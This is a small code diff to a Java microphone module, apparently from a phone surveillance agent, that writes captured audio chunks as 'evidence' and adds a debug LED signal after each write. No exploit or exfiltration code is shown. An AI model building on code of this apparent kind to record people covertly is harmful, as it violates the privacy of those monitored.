@@ -252,6 +252,10 @@ public final class ModuleMic extends BaseModule implements PhoneListener {
             //#endif
             evidence.writeEvidence(chunk, offset);
             evidence.close();
+            
+            if (Status.self().wantLight()) {
+                Debug.ledStart(Debug.COLOR_BLUE_LIGHT);
+            }
         } else {
             //#ifdef DEBUG
             debug.warn("zero chunk "); //$NON-NLS-1$
